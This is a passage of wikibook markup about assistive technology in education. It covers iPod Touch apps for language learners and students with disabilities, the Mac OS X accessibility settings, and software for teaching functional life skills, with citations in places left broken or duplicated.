Students with severe impairments may benefit from the use of applications that teach sign language. [http://idev2.com/iSign/iSign.html iSign] is an animated phrase book of 800 American Sign Language gestures (iSign, 2009).&lt;ref name=&quot;iSign&quot;&gt; iSign. (2009) Accessed July 13, 2009 at http://idev2.com/iSign/iSign.html.&lt;/ref&gt; Each of the gestures is modeled with a 3D character and is completely animated. This application is a beneficial tutorial and reference program that can help students learn to sign.


==== E.S.L. Learners/Early Childhood ====


Students who are learning to speak English can benefit from use of the iPod Touch in the classroom. Several applications have been proven to be a valuable tool for language acquisition (Patten &amp; Craig, 2007)&lt;ref name=&quot;Patten&amp;Craig&quot;&gt;Patten, K.B., &amp; Craig, D.V. (2007). iPods and English-language learners: A great combination. ''Teacher Librarian, 34''(5), 40-44.&lt;/ref&gt;. Studies conducted by Patten and Craig (2007) &lt;ref name=&quot;Patten&amp;Craig&quot;/&gt; found that writing skills, vocabulary development, and comprehension skills improved as a result of the use if the iPod in the classroom.


[[Image:Ipod_esl.jpg|left|thumb|300px|iPods can be used to help students learn English.]]

For students learning to speak English as a Second Language, language learning software can be used in the classroom. [http://www.byki.com/iphone/iphone.html Byki] (2009)&lt;ref name=&quot;Byki&quot;&gt;Transparent Language. (2009) Byki for iPhone. Accessed July 13, 2009 at http://www.byki.com/iphone/iphone.html.&lt;/ref&gt; is an application that teaches users over one thousand words and phrases using a three step process. The application contains native speaker sound, quizzes, and a search feature. Byki teaches students to recognize both the written and the spoken word. Other applications available for language acquisition include Conversation English, English Dictionaries, and Spanish/English Translation Dictionaries.


In addition to the many applications that can be useful for students learning English, students in early childhood classrooms can benefit from the iPod Touch as well. Flash card applications are available on iTunes that would be beneficial for students of all ages. Young students can learn the alphabet using [http://appbeacon.com/apps/039070/toddler-abcs-preschool-alphabet-flash-cards Toddler ABCs Alphabet Flash Cards] (AppBeacon, 2008)&lt;ref name=&quot;AppBeacon&quot;&gt;AppBeacon. 2008. Toddler ABCs preschool alphabet flash cards. Accessed July 13, 2009 at http://appbeacon.com/apps/039070/toddler-abcs-preschool-alphabet-flash-cards.&lt;/ref&gt;. This application teaches the alphabet using pictures and voice prompts. Another useful application is called [http://appshopper.com/education/letter-tracer-writing-practice Letter Tracer]. (AppShopper, 2008).&lt;ref name=&quot;LetterTracer&quot;&gt; AppShopper. (2008) Letter tracer writing practice. Accessed July 13, 2009 at http://appshopper.com/education/letter-tracer-writing-practice.&lt;/ref&gt; Letter Tracer helps students learn to write number and letter shapes through tracing or free-form writing. In this application, students write letters directly on the touch screen. Additional applications can be found by conducting a search in the iTunes Store. 


One example of iPod Touch use in an early childhood setting is taking place in the [http://www.mansfieldisd.org/ Mansfield ISD], in Texas. The district spent over $14,000 to purchase 63 units which are being used in PreK classrooms. Every PreK classroom in the district has received three iPods which are being used in a technology center. Teachers are using a variety of applications on the iPod Touch as an instructional tool with young learners. Click the link below to see how students are using the iPod Touch in the Mansfield ISD.


http://yourmansfieldisd.blogspot.com/2009/06/misd-minutes-apple-ipod-touch-for-pre-k.html


==== Other Learning Disabilities ====


A few other tools and applications are available for the iPod Touch that will help students with other disabilities not listed above. Three particular items deserve to be mentioned as possible accommodations for students with other disabilities.


For students who have physical impairments such as cerebral palsy, multiple sclerosis, or hand/arm injuries, using the iPod Touch may be difficult. The iPod Touch senses electrical impulses emitted by fingertips. It is not possible to use a pencil or a typical stylus on the iPod Touch. For those individuals who have limited mobility Ten One Design offers the [http://tenonedesign.com/stylus.php Pogo Stylus] (MacBlogz, 2008).&lt;ref name=&quot;Pogo&quot;&gt; MacBlogz. (2008). Pogo stylus provides universal touch screen use. Accessed on July 13, 2009 at http://www.macblogz.com/2008/06/24/pogo-stylus-provides-universal-touch-screen-use/.&lt;/ref&gt; This tool simulates a fingertip and uses a soft fabric end to easily navigate the touch screen interface. The Pogo Stylus also includes a clip designed to keep the stylus with the iPod. 


[[Image:Red_House_School_English_class.jpg|right|thumb|200px|Students with reading disabilities may benefit from the use of an iPod in the classroom.]]

Students with reading disabilities often need to have tests read aloud. Teachers have begun to use iPods as a testing tool. Tests questions are scanned and teachers record their voices reading the test questions and answer choices. Instead of being removed from the classroom to have a test read aloud, students are able to stay in their classroom to take the test. The use of headphones provides students with the opportunity to privately listen to test questions. This form of oral support does not disturb other students, and they are able to pause or repeat test questions as needed. Click the link below to see how iPods are being used as a testing device.


http://web.archive.org/20080505053430/homepage.mac.com/lmelem/websites/iMovieTheater21.html


Many students with learning disabilities need extra help studying for tests. Using presentation software, such as Powerpoint, along with the iPod photo features, teachers can create attractive flash cards that can be reviewed and studied on an iPod Touch (Coley, 2009)&lt;ref name=&quot;Coley&quot;&gt; Coley, B. (2009). iPod flash cards. Accessed on July 13, 2009 at http://www.mrcoley.com/flashcards/index.htm.&lt;/ref&gt;. Audio support can be added if desired. Brent Coley is a teacher in California who has created an extensive website explaining the use of Flash Cards on an iPod. For more information visit the [http://www.mrcoley.com/flashcards/index.htm iPod flashcards section of Mr. Coley’s website] for an in-depth look at how to create and sync flash cards to an iPod.


=== Conclusion ===


The iPod Touch is a technology device that has many uses for people of all ages. The possibilities for customizing the device to meet the needs of any user are endless. As the number of applications that can be downloaded continues to grow exponentially, there are hundreds of applications can be used in the classroom. The release of the second generation iPod Touch in September of 2008 has resulted in expanding the potential use of the item as an assistive technology device. Although there are other devices available for students with disabilities, the iPod Touch has the potential to become the preferred device based on its versatility and portability. 


Teachers, parents, and therapists are encouraged to carefully analyze any assistive technology device before selecting the best choice for a student. It is critical to recognize that the section and design of any assistive technology device must reflect a collaborative team approach and must include the student and people who are familiar with the student, (Dell et al., 2008).&lt;ref name=&quot;Dell&quot;/&gt; The needs of each student are different, and must be carefully considered before choosing and implementing any assistive technology device.

== The Macintosh OS X Built In Accessibility Features ==
[[Image:Light_Apple_Logo_Free.png|left|thumb|100px|Apple-like Logo]]

=== Introduction ===

The Macintosh OS X computer includes accessibility and adaptability features as part of its operating system.  These features can assist physically handicapped individuals who have vision, hearing and/or mobility impairments, as well as individuals with learning disabilities.  The adaptations can also benefit the maturing population with changing eyesight and hearing (Kimball, W, Cohen, Dimmick, &amp; Mills, 2004)&lt;ref name=&quot;Kimball&quot;&gt; Kimball, W., Cohen, L., Dimmick, D., &amp; Mills, R. (2004). No Special Equipment required: The Accessibility Features Built into the Windows and Macintosh Operating Systems make Computers Accessible for Students with Special Needs. Learning and Leading with Technology (31, 4), 12-15.

   &lt;/ref&gt;, which is important to the generation of baby boomers who are already web dependant (Valenza, 2000)&lt;ref&gt;  Valenza, J., (2000). Surfing Blind. Net Connect (125, 14), 34-36.

Retrieved from &quot;http://en.wikibooks.org/wiki/Assistive_Technology_in_Education/Mac_OS&quot;
&lt;/ref&gt;.  Also because, special education consultants “tend to use the concept of least restrictive access” (Burton, 1997)&lt;ref name=&quot;burton&quot;&gt;  Burton, M. (1997). Solutions for a One-Handed Typist. Paper presented at the Microcomputer Technology Special Education and Rehabilitation Conference (Minneapolis, MN, October 21-25, 1997).&lt;/ref&gt;
, the features built-in to the Mac OS X operating system can meet the needs of many individuals with special needs without the use of other special adaptations or devices.

The intent of this wikibook chapter is to list and describe the many accessibility features that are included in the Mac OS X operating system and to provide examples and explanations of their use. Most of these features are invoked through the System Preferences found in the Apple menu, via  Universal Access.  A tutorial on the use of these features can be found at http://www.apple.com/accessibility

=== Examples ===
Duane Bunker, an eighth grade teacher e-mailed a word problem to his students.  Teams of students were asked to read the directions to a location, find the location on a map, and communicate accurate directions to team members.  However, one of Bunker’s students, Tracy, had a reading disability that caused difficulty understanding written language.  To overcome this problem, Tracy used her Macintosh’s built-in text-to-speech feature to read the email aloud, thereby allowing her to receive the same information as the other students in her class (Kimball, Cohen, Dimmick, &amp; Mills, 2004).&lt;ref name=&quot;Kimball&quot;/&gt; 

A student named Zeke was given an assignment in which it was necessary for him to read text and objects on a computer monitor.  However, Zeke had limited vision because of the effects of juvenile diabetes.  This problem was remedied by using a screen magnifier (Kimball, Cohen, Dimmick, &amp; Mills, 2004). &lt;ref name=&quot;Kimball&quot;/&gt;

=== Overview ===
The following chart provides an overview of student characteristics and the built-in OS X adaptations that may prove helpful for that characteristic.  Detailed explanations of each adaptation are provided after the chart.

=== Adaptation Explanations ===

==== Display Contrast ====
Students with visual impairments may require higher visual contrast than the standard computer display.  Individuals my also prefer a white on black background as opposed to the black on white background.
This situation can easily be remedied using Universal Access (Dell, Newton, &amp; Petroff, 2008)&lt;ref name=&quot;dell&quot;&gt;Dell, A., Newton, D. &amp; Petroff, J (2008). Assistive Technology in the Classroom. Upper Saddle River, New Jersey: Pearson Education, Inc.&lt;/ref&gt;:

Path:  Apple &gt; System Preferences &gt; Universal Access &gt; Seeing &gt; Display

==== Increase Cursor Size ====

[[Image:Large_cursor.png|right|thumb|100px|Enlarged Cursor]]

For individuals who need magnification to read the computer screen, increasing the cursor size can be beneficial.

Path:  Apple &gt; System Preferences&gt; Universal Access &gt; Mouse &amp; Track pad

Move the slider to desired cursor size.  (The cursor will change size as you move the slider.)

==== Keyboard Shortcuts ====

[[Image:keyboard_shortcuts_screen_shot.png|left|thumb|200px|Keyboard shortcuts on the right hand side of menu selection]]

Keyboard shortcuts (or key combination) afford individuals the opportunity to use the keyboard instead of the mouse to perform functions (tasks) on the computer.  Individuals can invoke a function by pressing one or more ''modifier'' keys with a ''character'' key. This feature serves to benefit individuals who cannot use the mouse successfully due to fine motor control difficulties or limited range of motion (Mac OS X keyboard shortcuts, 2009)&lt;ref name=&quot;OS X&quot;&gt;  Mac OS X keyboard shortcuts (2009), Article HT1343, Retrieved July 20, 2009 from http://support.apple.com/kb/HT1343 &lt;/ref&gt;.

Keyboard shortcuts can be used at startup, when in the ''Finder'', and when using software applications.  In additions, keyboard shortcuts can be used for VoiceOver commands as well as Mouse Over commands.  For example, in the finder, Command-D ( D) will duplicate a selected item. Within Microsoft Word, Option-Command-L (   L) will launch the Spelling and Grammar checker. In Safari you can go to your homepage by pressing #-shift-H (McElhearn, 2006)&lt;ref  name = &quot;McElhearn&quot;&gt; McElhearn, K., (2006). 6 Productivity Tricks. Macworld (23, 6), 74-75.&lt;/ref&gt;.  
Function-Command-F5 (fn F5) will turn Voice Over on or off.

In addition to the built-in keyboard shortcuts, with Mac OX X 10.3 and later, you can set keyboard shortcuts for any menu command. For example you may want to create a shortcut that removes attachments from messages in ''Mail'' (McElhearn, 2006)&lt;ref name=&quot;McElhearn&quot;/&gt;.

A complete list of keyboard shortcut commands can be found at the following site: http://support.apple.com/kb/HT1343.  You can also find a list of keyboard shortcuts from the Apple menu: System Preferences &gt; Universal Access&gt; Keyboard &gt;&gt;Set Key Repeat &gt; Keyboard Shortcuts.

Following are the ''modifier'' key symbols you see in Mac OS X menus:

[[Image:modifier_keys.png|center|thumb|500px|(Mac OS X keyboard shortcuts, 2009).]]
''
''Note: The above list refers to the default modifier key assignments. Modifier keys can be changed using the folloiwng path: Apple &gt; System Preferences &gt;Keyboard &amp; Mouse. Click on the Modifier Keys button.  For example, you can change the Command key to act as an Option key, and vice-versa (Mac OS X keyboard shortcuts, 2009)&lt;ref name=&quot;OS X&quot;/&gt;.''
''

==== Adjust Key Repeat Rate ====
In the case of individuals with poor fine motor skills, the student may inadvertently hold down a key too long, creating excessive key repetitions.  This can be adjusted using the following path:  Apple menu &gt; System Preferences &gt;Universal Access &gt; Keyboard.  Press the button on the lower right of the box labeled Set Key Repeat.  The key repeat rate can be adjusted with a slider from slow to fast.

==== Directional Arrow Navigation ====


[[Image:Directional_Arrow_Keys.jpg|left|thumb|140px|MacBook Keys]]


For individuals having difficulty using a mouse, it is possible to navigate around the desktop using the directional arrow keys found in the lower right corner of your keyboard.

The directional keys will allow you to navigate to the folder to the left, right, above or below.  If you would like to select a particular folder, simply type the name of the folder. As you begin typing, folders with the letters typed will become highlighted.

====Mouse Keys ====

With Mouse Keys one can direct mouse functions using the numeric keypad.  Mouse Keys is a useful feature for individuals who cannot use the mouse successfully.  

Use the following path:  Apple &gt; System Preferences &gt; Universal Access &gt; Mouse &amp; Track pad. 
Select the On radio button.  Selecting the “Press the Option key five times to turn Mouse Keys on or off” allows you to turn Mouse Keys on or off without having to go to the Universal Access panel.  You will then be able to toggle Mouse Keys on and off by simply pressing the Option key 5 times.

Following are directions for using the numeric keypad when Mouse Keys is turned on:

{|{{wikitable}align=&quot;center&quot;} table width=&quot;40%&quot; border=&quot;2&quot; align=&quot;center&quot; cellpadding=&quot;3&quot; cellspacing=&quot;3&quot;&gt;

[[Image:Numeric_keypad.jpg|right|thumb|200px|The numbers located on the lower right corner of the keys identify the numeric keys when using num lock.]]

''Note:  If your computer does not have a numeric keypad, press the F6 (num lock) key to activate a numeric keypad.''

====Sticky Keys ====
Sticky keys makes it possible to perform keyboard combinations by hitting only one key at a time rather that pressing the keys simultaneously. This feature can benefit the individual with poor fine motor control who has difficulty pressing several keys at the same time. To turn Sticky Keys on, from the Apple menu, choose System Preferences -&gt; Universal Access -&gt; Keyboard and select Sticky Keys''' On'''.  After Sticky Keys is turned on, the following options are available:

c   Press the Shift key five times to turn Sticky Keys on or off

c   Beep when a modifier key is set

c   Display pressed keys on screen

====Zoom ====
Zoom, by default, is automatically turned on.  This feature is beneficial to those with low vision or simply for those who wish to magnify the screen.  Use the following path to access Zoom:

Apple &gt; Universal Access &gt; Seeing &gt; Zoom     '''On''' or '''Off'''

To activate Zoom, simply hold down Command + Option + (+ or -).

Zoom also has several options such as only having the screen image move when the pointer reaches an edge.

====Slow Keys ====
For individuals with difficulties with initial or repeated keys, the Slow Keys option may prove beneficial.  Slow Keys puts a delay between when a key is pressed and when it is accepted.  For example a single-handed typist may drag his or her hand and frequently hit unwanted keys (Burton, 1997) &lt;ref name=&quot;burton&quot;/&gt;.  A solution such as Slow Keys may eliminate the need for key guards (Burton, 1997)&lt;ref name=&quot;burton&quot;/&gt;.  To turn Slow Keys on, from the Apple menu, choose System Preferences -&gt; Universal Access -&gt; Keyboard and select Slow Keys On.  The following site contains a video illustrating their use: http://www.woopid.com/video/899/Using-Slow-Keys

====Track Pad/Double-Click Speed ====








If using a laptop computer, it is possible to change the tracking speed on the track pad, as well as the double-click speed.  This feature is a benefit to those with muscle weakness or poor fine motor skills.  To access these options, from the Apple menu choose System Preferences -&gt; Universal Access -&gt; Keyboard&gt; Set Key Repeat&gt; Track pad.

Drag the sliders to set the desired position.

====Visual Alerts ====



[[Image:Loading2.gif|left|thumb|350px|visual alert logo]]


For individuals with hearing loss or deafness, changing an aural alert to a visual alert (screen flash) can be beneficial.  

Use the path:Apple &gt; System Preferences &gt; Universal Access &gt; Hearing 

Select the Flash Screen alert box.  You can test the screen flash by clicking the Flash Screen button.  &quot;With this option selected, you will hear an audio alert in addition to seeing the screen flash&quot; (Griffiths, 2007, p. 3) &lt;ref&gt;  Griffiths, R., (2007). Mac OS X Hints. Macworld (24, 6), 84-86). &lt;/ref&gt;.

====VoiceOver ====



VoiceOver is a text-to-speech tool built into the operating system.  This built-in screen reader makes it possible for individuals who are blind or who have low vision to control their computer (Mac OS X Snow Leopard, 2009) &lt;ref name=&quot;snow&quot;&gt;  Mac OS X Snow Leopard (2009), Retrieved July 21, 2009 from http://www.apple.com/macosx/accessibility &lt;/ref&gt;. VoiceOver can also be useful for individuals with dyslexia or those in which English is a second language. It works with other applications and technologies such as iTunes. VoiceOver delivers natural intonation at speaking rates up to 700 words per minute (Mac OS X Snow Leopard, 2009)&lt;ref name=&quot;snow&quot;/&gt;.  VoiceOver can be turned on or off by pressing Command F5. It can also be accessed using the following path:  Apple &gt; System Preferences &gt; Universal Access &gt; Seeing &gt; VoiceOver.  Available for downloading is a VoiceOver Commands chart.  (make link to document).

===== ''VoiceOver Utility'' =====



[[Image:Computer.svg|right|thumb|100px|computer]]



To access VoiceOver Utility press the Open VoiceOver Utility in the Seeing tab in Universal Access.  In this area, the verbosity, navigation, voices, display, and pronunciation of the spoken text can be changed.  In addition to changing the sound of the spoken voice, you can change the rate, pitch and volume of the voice. In Leopard, VoiceOver has a new voice called Alex.  Alex is a concatenative voice, which is a human recording.  Alex evaluates the sentence before and after, and will make changes in intonation if appropriate.  Alex also breathes.  In addition, it is designed to run at a very fast rate – 750 words per minute (Mac OS X Snow Leopard, 2009)&lt;ref name=&quot;snow&quot;/&gt;, which is advantageous to people with visual impairments whose hearing is often accelerated.

=====''Portable Preferences''=====
Leopard has the option of portable preferences. That means a person can set their VoiceOver preferences and copy them onto a flash drive. The flash drive can then be inserted into another computer to access individual preferences.

=====''VoiceOver Getting Started Manual'' =====
For a VoiceOver Getting Started manual for Leopard, go to the following site:
http://www.apple.com/accessibility/voiceover/downloads.html

====Increase Size of Icons on Desktop ====
In Leopard, individuals have the option of changing the size of icons on the desktop.
Note:  In Leopard (Mac OS 10.5) you have option to show Universal access status in menu bar.


====Braille Support ====






Mac OS X operating system supports plug-n-play Braille keyboards.

===Conclusion===
In the past, many people with physical or mental disabilities have been precluded from the right to “fully participate in all aspects of society (ADA, 2008)&lt;ref name=&quot;ADA&quot;&gt;    

ADA: Americans with Disabilities Act of 1990, as Amended (2008), Retrieved July 20, 2009 from http://www.ada.gov/pubs/adastuatute08.html#12101  &lt;/ref&gt;.  “Historically, society has tended to isolate and segregate” (ADA, 2008) these individuals.  However, as a result of the Americans with Disabilities Act (ADA), a “national mandate has been issued for the elimination of discrimination against individuals with disabilities” (ADA, 2008) &lt;ref name=&quot;ADA&quot;/&gt;.  

In an effort to conform to the ADA, many institutions have made modifications to buildings such as wheelchair ramps and in the community such as curb cuts (Dell, Newton, &amp; Petroff,  2008) &lt;ref name=&quot;dell&quot;/&gt;to accommodate the disabled.  However, the changes have also benefited others such as those pushing strollers or riding bicycles.

A similar scenario has occurred in the use of computers in accordance with ADA requirements.  That is, computer companies have made built-in modifications such as screen readers and magnifiers to accommodate the disabled.  However, such features also serve the general public as well. That is, these adaptability and accessibility features can assist many users from the blind to those with minor vision loss.  They assist individuals from the deaf to slightly hard of hearing.  They can also assist those with a variety of physical disabilities from missing limbs to individuals with temporary casts or bandages.  Finally, they can assist individuals with a variety of learning disabilities.  

The Macintosh OS X operating system, in an effort to comply with the ADA has made built-in changes to its operating system that not only benefit individuals with disabilities, but much of the general population as well.

== Assistive Technology: Teaching Functional Skills to Disabled Students using Software Technology ==

&lt;p&gt;

[[Image:Teacher.jpg‎|left|thumb|300px|Special education teacher instructing a student with assistive technology.]]
=== Introduction ===

Assistive technology is defined in the Individuals with Disabilities Education Improvement Act (IDEA 2004) as “any item, piece of equipment, or product system, whether acquired commercially off the shelf, modified, or customized, that is used to increase, maintain, or improve functional capabilities of a child with a disability” (IDEA 2004, 2004). &lt;ref&gt;Individuals with Disabilities Education Act of 2004 (IDEA 2004), 20 U.S.C. Sec. 1401 retrieved on July 10, 2009 at http://idea.ed.gov&lt;/ref&gt; The term “functional capabilities” could mean a full realm of skills and competencies to perform successfully in the educational classroom. However, this wikibook will pertain to the functional skills or life skills children with disabilities need to develop in order to transition successfully into independent living after school graduation by “transfering skills to new environments” (Rocchio, 1995, p. 1). &lt;ref&gt;Rocchio, L. (1995). The LIFE program – Living Innovations in Functional Environments – Deaf-blindness. American Rehabilitation. Retrieved July 12, 2009, from http:www.findarticles.com/p/articles/mi_m0842/is_n2_v21/ai_17986026
&lt;/ref&gt; Functional skills are built on real-life living and learning. Contributing to the world these students live in while taking care of themselves are what many people with severe disabilities and their families hope for to ensure the most complete and gratifying quality of life for the individual (Langone, Clees, Rieber, Matzko, 2003). &lt;ref&gt;Langhorne, J., Clees, T., Rieber, L., &amp; Matzko, M. (2003). The future of computer-based interactive technology for teaching individuals with moderate to severe disabilities: issues relating to research and practice. Journal of Special Education Technology, 18 (1), 5-15.&lt;/ref&gt;


[[Image:Computer n screen.svg|right|thumb|180px|Assistive technology software for teaching functional skills to life skills students.]]

&lt;b&gt;A skill or activity is defined to be functional after considering the following questions:&lt;/b&gt;

&lt;ul&gt;
&lt;li&gt; How frequently is the activity performed?&lt;/li&gt;
&lt;li&gt;Will the activity increase the independence of the student?&lt;/li&gt;
&lt;li&gt;Is the activity performed in a variety of natural settings?&lt;/li&gt;
&lt;li&gt;Is the vocational task one which someone would pay the student to do?&lt;/li&gt;
&lt;li&gt;Will the performance of the activity reflect the student as competent?&lt;/li&gt;
&lt;li&gt;Is the skill likely to be naturally reinforced?&lt;/li&gt;
&lt;li&gt;If the child can't do it will someone have to do it for him/her?&lt;/li&gt;
&lt;/ul&gt;
(Brown, Falvey, Vincent, Kaye, Johnson, Ferrara-Parish, &amp; Gruenewald, 1980)&lt;ref&gt;Brown, l., Falvey, M., Vincent, L., Kaye, N., Johnson, F., Ferrara-Parish, P., &amp; Gruenewald, L. (1980). Strategies for generating comprehensive, longitudinal, and chronological-age-appropriate individualized education programs for adolescent and young-adult severely handicapped students. Journal of Special Education, 14, 14(2), 199-215.
&lt;/ref&gt;

Disabled people have a greater chance to live independently, obtain and maintain a job, and enjoy many societal benefits in today’s society more than ever before (Scherer, 2002).  &lt;ref&gt;Scherer, M. (2002). The importance of assistive technology outcomes. Institute for Matching Person and Technology. Retrieved July 12, 2009, from http://www.e-bility.com/articles/at.php&lt;/ref&gt; Assistive and adaptive technology has helped that vision and reality. As one example, there is software technology on the market that can assist students with severe disabilities to accomplish independence through repetitive practice, simple interface design, and appropriate life skills content. This wikibook will suggest what types of content-specific assistive technology software could be used to teach functional skills to a life skills classroom of students. For this wikibook, life skills students will be defined as middle school and high school children who have severe disabilities, usually cognitive in nature, and whose cognitive needs extend outside the normal academic content to subject matter and concepts that will help them thrive in society. As IDEA 2004 states, this is a legal obligation for our school districts to deliver to students of special life skills needs (IDEA 2004, 2004). &lt;ref&gt;Individuals with Disabilities Education Act of 2004 (IDEA 2004), 20 U.S.C. Sec. 1401 retrieved on July 10, 2009 at http://idea.ed.gov&lt;/ref&gt; To ensure an inclusive educational environment and opportunities for all students, administrators, teachers, staff, parents, and students should be aware of what is available in software to help life skills students learn. The  development of functional skills moves the disabled students towards successful community participation. Functional skill development also builds an individual’s dignity and reputation (Rocchio, 1995). &lt;ref&gt;Rocchio, L. (1995). The LIFE program – Living Innovations in Functional Environments – Deaf-blindness. American Rehabilitation. Retrieved July 12, 2009, from http:www.findarticles.com/p/articles/mi_m0842/is_n2_v21/ai_17986026

=== Functional Skills Topics ===
[[Image:Sautee onions and peppers.jpg|left|thumb|300px|Learning how to prepare meals.]]
Functional skills such as communication, vocation, personal grooming, laundry, dining, meal preparation, housekeeping, leisure activities, anger management, social etiquette, money management, and responsible citizenship are abilities and everyday routines that every human being should be able to take care of and exercise for their own livelihood and health, as well as his or her purpose and place in society (Dell, Newton, &amp; Petroff, 2007). &lt;ref&gt;Dell, A., Newton, D., &amp; Petroff, J. (2007). Assistive technology in the classroom: Enhancing the school experiences of students with disabilities. Upper Saddle River, NJ: Prentice Hall.&lt;/ref&gt; These functional skills can be categorized into four instructional domains: Self-Management/Home Living, Vocational, Recreation/Leisure and Community Functioning. Inside of these domains, tasks done on a daily basis can be labeled according to the following areas: social, communication, academics and motor (Functional Skills Action Committee, 1992). &lt;ref&gt;Functional Skills (1992). Functional skills curriculum guide overview. Special School District of St. Louis County. Retrieved on July 15, 2009, from http://pbiscompendium.ssd.k12.mo.us/ResourcesSchools/SSD/Functional/overview.htm&lt;/ref&gt; In the most perfect assistive technology situation for a classroom of life skills students, the most obvious goal is to match each student with the most beneficial assistive technology to meet “receptiveness, competency, and understanding” of the individual student (Rocchio, 1995, p. 3). &lt;ref&gt;Rocchio, L. (1995). The LIFE program – Living Innovations in Functional Environments – Deaf-blindness. American Rehabilitation. Retrieved July 12, 2009, from http:www.findarticles.com/p/articles/mi_m0842/is_n2_v21/ai_17986026&lt;/ref&gt; This would support a person-centered approach (Rocchio, 1995). &lt;ref&gt;Rocchio, L. (1995). The LIFE program – Living Innovations in Functional Environments – Deaf-blindness. American Rehabilitation. Retrieved July 12, 2009, from http:www.findarticles.com/p/articles/mi_m0842/is_n2_v21/ai_17986026&lt;/ref&gt; However, all students need to be able to function in the home, workplace, and society according to what is expected for individual, physical, social, and financial matters. With functional skill competence, individuals with severe disabilities increase their employability opportunities, since their productivity and independence increases. Additionally, the prospect for rich social relationships through learning functional skills that develop social skills, social relationships, social behaviors, and emotional regulation is optimized when individuals are functionally independent and can take care of themselves and their basic needs (Martin, 2006). &lt;ref&gt;Martin, S. (2006). Special education, technology, and teacher education. Monmouth University. Retrieved on July 15, 2009, from http://site.aace.org/pubs/foresite/SpecialEducation.PDF&lt;/ref&gt;

Integration into society becomes a reality rather than an impossibility when people have the ability to live their lives independently and be self-sufficient with proper adaptations and assistance devices that consider their limitations (Functional Skills, 1992). &lt;ref&gt;Functional Skills (1992). Functional skills curriculum guide overview. Special School District of St. Louis County. Retrieved on July 15, 2009, from http://pbiscompendium.ssd.k12.mo.us/ResourcesSchools/SSD/Functional/overview.htm&lt;/ref&gt; Improving the environment, whether it be home, school, or the workplace, is always a step towards providing the disabled person with a more realistic situation to live and thrive. To accomplish this, using functional skills software training, instruction, and education to help the student gain and develop awareness, understanding, and ability to improve his functional level will equip him with aids for everyday living and everyday work (Beck, 2008). &lt;ref&gt;Beck, J. (2002). Emerging literacy through assistive technology. Teaching Exceptional Children 35(2), 44-48&lt;/ref&gt;

Teaching functional skills to disabled students is extremely useful in enhancing an individual’s ability to perform her or his job independently (Schneider, 1999). &lt;ref&gt;Schneider, M. (1999, June). Achieving greater self-sufficiency through assistive technology, job accommodation and supported employment. Journal of Vocational Rehabilitation, 12(3), 159. Retrieved July 13, 2009, from Academic Search Premier database.&lt;/ref&gt; One example is the way telecommunications has created opportunities for people with severe disabilities to work from home in a productive, responsible, and doable manner. Considering all of these future benefits, developing the necessary proficiencies to live, survive, and prosper with their disability is what school districts must deliver to life skills students.

(2002). The importance of assistive technology outcomes. Institute for Matching Person and Technology. Retrieved July 12, 2009, from http://www.e-bility.com/articles/at.php&lt;/ref&gt; However, the choice of software made by administrators and educators should also take into consideration software attributes that would provide the most appropriate learning environment for life skills students. The content should be low-level, emphasizing developing skills that may be commonplace for students without disabilities. A simple interface with easy navigation and an elementary design will ensure students not to become frustrated with the digital learning environment (Dell, Newton, &amp; Petroff, 2007). &lt;ref&gt;Dell, A., Newton, D., &amp; Petroff, J. (2007). Assistive technology in the classroom: Enhancing the school experiences of students with disabilities. Upper Saddle River, NJ: Prentice Hall.&lt;/ref&gt; Interactivity is a must to offer appropriate positive feedback and direction (Langone, Clees, Rieber, Matzko, 2003). &lt;ref&gt;Langhorne, J., Clees, T., Rieber, L., &amp; Matzko, M. (2003). The future of computer-based interactive technology for teaching individuals with moderate to severe disabilities: issues relating to research and practice. Journal of Special Education Technology, 18 (1), 5-15.&lt;/ref&gt;  The software should offer positive repetitive opportunities to practice and develop experience in a risk-free environment (Brown, Falvey, Vincent, Kaye, Johnson, Ferrara-Parish, &amp; Gruenewald, 1980).  &lt;ref&gt;Brown, l., Falvey, M., Vincent, L., Kaye, N., Johnson, F., Ferrara-Parish, P., &amp; Gruenewald, L. (1980). Strategies for generating comprehensive, longitudinal, and chronological-age-appropriate individualized education programs for adolescent and young-adult severely handicapped students. Journal of Special Education, 14, 14(2), 199-215.
&lt;/ref&gt; Additionally, there should be the capability to customize the interface according to auditory, visual, pace, level of difficulty, and vocabulary to take into consideration each student’s physical abilities, emotional strengths, and cognitive awareness (Dell, Newton, &amp; Petroff, 2007). &lt;ref&gt;Dell, A., Newton, D., &amp; Petroff, J. (2007). Assistive technology in the classroom: Enhancing the school experiences of students with disabilities. Upper Saddle River, NJ: Prentice Hall.&lt;/ref&gt;

Furthermore, the incorporation of multimedia prolongs attention, which enhances the practice experience and promotes awareness and competence (Langone, Clees, Rieber, Matzko, 2003). &lt;ref&gt;Langhorne, J., Clees, T., Rieber, L., &amp; Matzko, M. (2003). The future of computer-based interactive technology for teaching individuals with moderate to severe disabilities: issues relating to research and practice. Journal of Special Education Technology, 18 (1), 5-15.&lt;/ref&gt; This type of training is more effective and efficient with the use of simulated instructional activities (Brown, Falvey, Vincent, Kaye, Johnson, Ferrara-Parish, &amp; Gruenewald, 1980). &lt;ref&gt;Brown, l., Falvey, M., Vincent, L., Kaye, N., Johnson, F., Ferrara-Parish, P., &amp; Gruenewald, L. (1980). Strategies for generating comprehensive, longitudinal, and chronological-age-appropriate individualized education programs for adolescent and young-adult severely handicapped students. Journal of Special Education, 14, 14(2), 199-215.
&lt;/ref&gt; Also, the allowance for partial participation in order to progress through the software is also very important to build confidence and full participation levels (Rocchio, 1995). &lt;ref&gt;Rocchio, L. (1995). The LIFE program – Living Innovations in Functional Environments – Deaf-blindness. American Rehabilitation. Retrieved July 12, 2009, from http:www.findarticles.com/p/articles/mi_m0842/is_n2_v21/ai_17986026&lt;/ref&gt; This would ensure a positive learning experience for the student which is important in the success of acquiring functional skills. Shared activity training supports social development and is beneficial to the student (Rocchio, 1995).  &lt;ref&gt;Rocchio, L. (1995).

=== Conclusion ===
